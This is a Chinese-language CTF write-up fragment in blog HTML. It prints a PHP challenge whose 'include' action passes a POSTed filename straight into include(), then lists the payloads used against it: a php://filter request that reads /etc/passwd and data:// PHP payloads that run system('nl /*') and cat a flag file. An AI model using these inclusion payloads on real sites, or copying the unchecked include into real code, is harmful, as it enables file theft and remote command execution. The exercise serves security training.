<p>尝试?number&#x3D;1111..&#x2F;，失败</p><p>数字爆破</p><p>输入?number&#x3D;114514</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please pass in \&quot;number\&quot; value &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;the number value between 111111 and 999999:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;number&quot;</span>]==<span class="number">114514</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK!Please find the flag!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;read&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$filename</span>=<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">            <span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>]== <span class="string">&quot;include&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$filename</span>=<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?n</span>umber=<span class="number">114514</span>&amp;action=<span class="keyword">include</span></span><br><span class="line">filename=<span class="symbol">php:</span>/<span class="regexp">/filter/convert</span>.base64-encode/resource=<span class="regexp">/etc/passwd</span></span><br></pre></td></tr></table></figure><p>有回显，存在本地文件包含</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?number=114514&amp;action=include</span></span><br><span class="line"><span class="language-xml">filename=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nl /*&quot;</span>); <span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">filename=data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /OgcyNDmiofooYd4j&quot;</span>); <span class="meta">?&gt;</span></span><span class="language-xml">也可以            OgcyNDmiofooYd4j是ls /得到的</span></span><br></pre></td></tr></table></figure><span id="more"></span>]]></content>
      
      
